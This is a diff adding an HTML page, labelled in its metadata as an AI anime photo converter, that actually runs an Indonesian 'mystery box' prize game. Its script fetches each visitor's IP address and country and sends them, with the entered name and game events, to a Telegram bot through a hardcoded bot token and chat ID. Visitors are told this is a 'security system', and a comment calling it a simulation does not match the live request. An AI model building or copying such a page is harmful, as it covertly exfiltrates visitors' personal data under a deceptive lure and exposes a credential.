@@ -1,0 +1,622 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <title>RyLac TOOLS - Image to Anime Converter</title>
+    <meta name="description" content="Convert your photos to anime style with AI technology">
+    <meta name="keywords" content="RyLac, Anime Converter, Photo to Anime, AI Art, Loli Style, Anime Style">
+    <meta name="author" content="Zayn dan Reni">
+    
+    <!-- Favicon -->
+    <link rel="icon" href="https://files.catbox.moe/zj48ha.jpg" type="image/jpeg">
+    
+    <!-- Open Graph (for social sharing) -->
+    <meta property="og:title" content="RyLac TOOLS - Image to Anime Converter">
+    <meta property="og:description" content="Convert your photos to anime style with AI technology">
+    <meta property="og:image" content="https://files.catbox.moe/zj48ha.jpg">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://namasitusanda.com">
+    
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            color: white;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 600px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .name-form {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .game-screen {
+            display: none;
+        }
+
+        h1 {
+            margin-bottom: 20px;
+            font-weight: 600;
+            font-size: 2rem;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .stats {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            font-size: 1.1rem;
+            font-weight: 500;
+        }
+
+        .boxes-container {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .box {
+            aspect-ratio: 1/1;
+            background: rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(5px);
+            -webkit-backdrop-filter: blur(5px);
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 600;
+            font-size: 1.2rem;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .box:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        .box::before {
+            content: "?";
+            position: absolute;
+            font-size: 2rem;
+            color: white;
+            font-weight: bold;
+        }
+
+        .box.revealed {
+            transform: scale(0.95);
+        }
+
+        .box.revealed::before {
+            display: none;
+        }
+
+        .box-content {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 10px;
+            text-align: center;
+            width: 100%;
+            height: 100%;
+        }
+
+        .box.revealed .box-content {
+            display: flex;
+        }
+
+        .box-icon {
+            font-size: 2rem;
+            margin-bottom: 5px;
+        }
+
+        .box-text {
+            font-size: 0.8rem;
+            font-weight: 500;
+        }
+
+        .box.zonk {
+            background: rgba(255, 99, 71, 0.7);
+            animation: shake 0.5s;
+        }
+
+        .box.biolink {
+            background: rgba(75, 192, 192, 0.7);
+            animation: pulse 0.5s;
+        }
+
+        .box.saldo {
+            background: rgba(153, 102, 255, 0.7);
+            animation: bounce 0.5s;
+        }
+
+        .result {
+            margin-top: 20px;
+            font-size: 1.3rem;
+            font-weight: 500;
+            min-height: 30px;
+            padding: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            backdrop-filter: blur(5px);
+            -webkit-backdrop-filter: blur(5px);
+        }
+
+        .restart-btn {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            color: white;
+            padding: 12px 25px;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(5px);
+            -webkit-backdrop-filter: blur(5px);
+            margin-top: 20px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .restart-btn:hover {
+            background: rgba(255, 255, 255, 0.3);
+            transform: translateY(-2px);
+        }
+
+        .restart-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .start-btn {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            color: white;
+            padding: 12px 25px;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(5px);
+            -webkit-backdrop-filter: blur(5px);
+            margin-top: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .start-btn:hover {
+            background: rgba(255, 255, 255, 0.3);
+            transform: translateY(-2px);
+        }
+
+        .start-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        input {
+            background: rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50px;
+            padding: 12px 20px;
+            color: white;
+            font-size: 1rem;
+            outline: none;
+            width: 100%;
+            backdrop-filter: blur(5px);
+            -webkit-backdrop-filter: blur(5px);
+        }
+
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        .note {
+            font-size: 0.8rem;
+            opacity: 0.8;
+            margin-top: 5px;
+        }
+
+        .security-info {
+            font-size: 0.7rem;
+            margin-top: 20px;
+            opacity: 0.6;
+            background: rgba(0, 0, 0, 0.2);
+            padding: 8px;
+            border-radius: 5px;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-20px); }
+            60% { transform: translateY(-10px); }
+        }
+
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background-color: #f00;
+            border-radius: 50%;
+            animation: confetti-fall 3s linear forwards;
+        }
+
+        @keyframes confetti-fall {
+            0% {
+                transform: translateY(-100px) rotate(0deg);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(1000px) rotate(720deg);
+                opacity: 0;
+            }
+        }
+
+        @media (max-width: 600px) {
+            .boxes-container {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 10px;
+            }
+            
+            .container {
+                padding: 20px;
+            }
+            
+            h1 {
+                font-size: 1.5rem;
+            }
+            
+            .box-icon {
+                font-size: 1.5rem;
+            }
+            
+            .box-text {
+                font-size: 0.7rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Form Input Nama -->
+        <div class="name-form" id="nameForm">
+            <h1>Masukkan Nama Anda</h1>
+            <input type="text" id="playerName" placeholder="Nama Anda" required>
+            <div class="note">Admin: Semoga Beruntung</div>
+            <button class="start-btn" id="startBtn">Mulai Permainan</button>
+            <div class="security-info">
+                <div>Permainan ini dilindungi sistem keamanan</div>
+                <div id="ipInfo">Mendeteksi IP Anda...</div>
+                <div></div>
+                <div></div>
+            </div>
+        </div>
+
+        <!-- Layar Permainan -->
+        <div class="game-screen" id="gameScreen">
+            <h1>Vynaa MD Mystery Box</h1>
+            <div class="stats">
+                <div>Kesempatan: <span id="chances">2</span></div>
+                <div>Hadiah: <span id="prizes">0</span></div>
+            </div>
+            <div class="boxes-container" id="boxes"></div>
+            <div class="result" id="result">Pilih kotak untuk memulai!</div>
+            <button class="restart-btn" id="restartBtn" disabled>Main Lagi</button>
+            <div class="security-info">
+                <div>ID Sesi: <span id="sessionId"></span></div>
+                <div id="playerInfo"></div>
+                <div></div>
+                <div></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Elemen DOM
+            const nameForm = document.getElementById('nameForm');
+            const gameScreen = document.getElementById('gameScreen');
+            const playerNameInput = document.getElementById('playerName');
+            const startBtn = document.getElementById('startBtn');
+            const boxesContainer = document.getElementById('boxes');
+            const chancesElement = document.getElementById('chances');
+            const prizesElement = document.getElementById('prizes');
+            const resultElement = document.getElementById('result');
+            const restartButton = document.getElementById('restartBtn');
+            const ipInfoElement = document.getElementById('ipInfo');
+            const sessionIdElement = document.getElementById('sessionId');
+            const playerInfoElement = document.getElementById('playerInfo');
+            
+            // Variabel game
+            let chances = 2;
+            let prizesWon = 0;
+            let boxes = [];
+            let revealedBoxes = 0;
+            let playerName = '';
+            let playerIP = '';
+            let country = '';
+            let sessionId = '';
+            let gameActive = false;
+            let initialReportSent = false;
+            
+            // Konfigurasi Telegram
+            const BOT_TOKEN = '7650452719:AAFHHGc3xM2vzBF4JHZaBJgPHJluZADgLA4';
+            const CHAT_ID = '1618920755';
+            
+            // Dapatkan info IP pemain
+            fetch('https://api.myip.com')
+                .then(response => response.json())
+                .then(data => {
+                    playerIP = data.ip;
+                    country = data.country;
+                    ipInfoElement.textContent = `IP: ${playerIP} | Negara: ${country}`;
+                    
+                    // Generate session ID berdasarkan IP dan timestamp
+                    sessionId = generateSessionId(playerIP);
+                    sessionIdElement.textContent = sessionId;
+                })
+                .catch(error => {
+                    console.error('Error fetching IP info:', error);
+                    ipInfoElement.textContent = 'Sistem keamanan aktif';
+                    // Default IP untuk development
+                    playerIP = '112.215.245.147';
+                    country = 'Indonesia';
+                    sessionId = generateSessionId(playerIP);
+                    sessionIdElement.textContent = sessionId;
+                });
+            
+            // Generate session ID
+            function generateSessionId(ip) {
+                const timestamp = Date.now();
+                return btoa(`${ip}-${timestamp}`).substring(0, 12);
+            }
+            
+            // Start game ketika nama diisi
+            startBtn.addEventListener('click', function() {
+                playerName = playerNameInput.value.trim();
+                
+                if (playerName === '') {
+                    alert('Silakan masukkan nama Anda terlebih dahulu!');
+                    return;
+                }
+                
+                // Kirim data ke Telegram hanya jika belum dikirim
+                if (!initialReportSent) {
+                    sendToTelegram(`🎮 *Pemain Baru Memulai Game* 🎮\n\n📛 Nama: ${playerName}\n🌐 IP: ${playerIP}\n📍 Negara: ${country}\n🆔 Sesi: ${sessionId}`);
+                    initialReportSent = true;
+                }
+                
+                // Tampilkan layar game
+                nameForm.style.display = 'none';
+                gameScreen.style.display = 'block';
+                playerInfoElement.textContent = `Pemain: ${playerName} | IP: ${playerIP}`;
+                
+                // Inisialisasi game
+                initGame();
+            });
+            
+            // Fungsi untuk mengirim data ke Telegram
+            function sendToTelegram(message) {
+                // Ini hanya simulasi, di implementasi nyata perlu backend
+                console.log('Mengirim ke Telegram:', message);
+                
+                // Format pesan untuk mode markdown
+                const formattedMessage = encodeURIComponent(message);
+                
+                // Buat URL untuk mengirim pesan (hanya contoh, tidak akan bekerja tanpa backend)
+                const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${formattedMessage}&parse_mode=Markdown`;
+                
+                // Simulasi pengiriman (di production, gunakan backend sebenarnya)
+                fetch(telegramUrl)
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Telegram response:', data);
+                    })
+                    .catch(error => {
+                        console.error('Error sending to Telegram:', error);
+                    });
+            }
+            
+            // Inisialisasi game
+            function initGame() {
+                // Reset state game
+                boxes = [];
+                revealedBoxes = 0;
+                chances = 2;
+                prizesWon = 0;
+                gameActive = true;
+                
+                // Update UI
+                chancesElement.textContent = chances;
+                prizesElement.textContent = prizesWon;
+                resultElement.textContent = 'Pilih kotak untuk memulai!';
+                restartButton.disabled = true;
+                
+                // Kosongkan container kotak
+                boxesContainer.innerHTML = '';
+                
+                // Buat array hadiah (4 Zonk, 3 Biolink, 3 Saldo 10k)
+                const prizes = [
+                    'zonk', 'zonk', 'zonk', 'zonk',
+                    'biolink', 'biolink', 'biolink',
+                    'zonk', 'saldo', 'saldo'
+                ];
+                
+                // Acak hadiah
+                for (let i = prizes.length - 1; i > 0; i--) {
+                    const j = Math.floor(Math.random() * (i + 1));
+                    [prizes[i], prizes[j]] = [prizes[j], prizes[i]];
+                }
+                
+                // Buat kotak-kotak
+                for (let i = 0; i < 10; i++) {
+                    const box = document.createElement('div');
+                    box.className = 'box';
+                    box.dataset.index = i;
+                    box.dataset.type = prizes[i];
+                    
+                    // Buat konten hadiah (disembunyikan awalnya)
+                    const boxContent = document.createElement('div');
+                    boxContent.className = 'box-content';
+                    
+                    const boxIcon = document.createElement('div');
+                    boxIcon.className = 'box-icon';
+                    
+                    const boxText = document.createElement('div');
+                    boxText.className = 'box-text';
+                    
+                    if (prizes[i] === 'zonk') {
+                        boxIcon.innerHTML = '<i class="fas fa-times-circle"></i>';
+                        boxText.textContent = 'ZONK!';
+                    } else if (prizes[i] === 'biolink') {
+                        boxIcon.innerHTML = '<i class="fas fa-link"></i>';
+                        boxText.textContent = 'Biolink';
+                    } else if (prizes[i] === 'saldo') {
+                        boxIcon.innerHTML = '<i class="fas fa-coins"></i>';
+                        boxText.textContent = 'Saldo 10K';
+                    }
+                    
+                    boxContent.appendChild(boxIcon);
+                    boxContent.appendChild(boxText);
+                    box.appendChild(boxContent);
+                    
+                    box.addEventListener('click', handleBoxClick);
+                    
+                    boxesContainer.appendChild(box);
+                    boxes.push(box);
+                }
+            }
+            
+            function handleBoxClick(e) {
+                if (!gameActive || chances <= 0) return;
+                
+                const box = e.currentTarget;
+                const boxType = box.dataset.type;
+                
+                // Jangan biarkan kotak yang sudah terbuka diklik lagi
+                if (box.classList.contains('revealed')) return;
+                
+                // Tampilkan isi kotak
+                box.classList.add('revealed', boxType);
+                revealedBoxes++;
+                
+                // Periksa hadiah yang didapat
+                if (boxType === 'zonk') {
+                    resultElement.textContent = 'Yah! Anda dapat ZONK!';
+                    sendToTelegram(`❌ *ZONK* ❌\n\n📛 Pemain: ${playerName}\n🔄 Sisa kesempatan: ${chances-1}\n🆔 Sesi: ${sessionId}`);
+                } else if (boxType === 'biolink') {
+                    prizesWon++;
+                    resultElement.textContent = 'Selamat! Anda menang BIOLINK!';
+                    createConfetti(box);
+                    sendToTelegram(`🎉 *MENANG BIOLINK* 🎉\n\n📛 Pemain: ${playerName}\n🔄 Sisa kesempatan: ${chances-1}\n🏆 Total hadiah: ${prizesWon}\n🆔 Sesi: ${sessionId}`);
+                } else if (boxType === 'saldo') {
+                    prizesWon++;
+                    resultElement.textContent = 'Selamat! Anda menang SALDO 10K!';
+                    createConfetti(box);
+                    sendToTelegram(`💰 *MENANG SALDO 10K* 💰\n\n📛 Pemain: ${playerName}\n🔄 Sisa kesempatan: ${chances-1}\n🏆 Total hadiah: ${prizesWon}\n🆔 Sesi: ${sessionId}`);
+                }
+                
+                // Update jumlah hadiah
+                prizesElement.textContent = prizesWon;
+                
+                // Gunakan satu kesempatan
+                chances--;
+                chancesElement.textContent = chances;
+                
+                // Cek apakah game sudah selesai
+                if (chances <= 0) {
+                    gameActive = false;
+                    setTimeout(() => {
+                        resultElement.textContent += '\nPermainan selesai!';
+                        restartButton.disabled = false;
+                        
+                        // Kirim laporan akhir ke Telegram
+                        sendToTelegram(`🏁 *PERMAINAN SELESAI* 🏁\n\n📛 Pemain: ${playerName}\n🏆 Total hadiah: ${prizesWon}\n🌐 IP: ${playerIP}\n📍 Negara: ${country}\n🆔 Sesi: ${sessionId}`);
+                    }, 1000);
+                }
+            }
+            
+            function createConfetti(element) {
+                const rect = element.getBoundingClientRect();
+                const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff'];
+                
+                for (let i = 0; i < 50; i++) {
+                    const confetti = document.createElement('div');
+                    confetti.className = 'confetti';
+                    confetti.style.left = `${rect.left + rect.width / 2}px`;
+                    confetti.style.top = `${rect.top}px`;
+                    confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                    confetti.style.width = `${Math.random() * 8 + 4}px`;
+                    confetti.style.height = `${Math.random() * 8 + 4}px`;
+                    confetti.style.animationDuration = `${Math.random() * 2 + 2}s`;
+                    
+                    document.body.appendChild(confetti);
+                    
+                    // Hapus confetti setelah animasi
+                    setTimeout(() => {
+                        confetti.remove();
+                    }, 3000);
+                }
+            }
+            
+            // Tombol main lagi
+            restartButton.addEventListener('click', function() {
+                initGame();
+            });
+        });
+    </script>
+</body>
+</html>
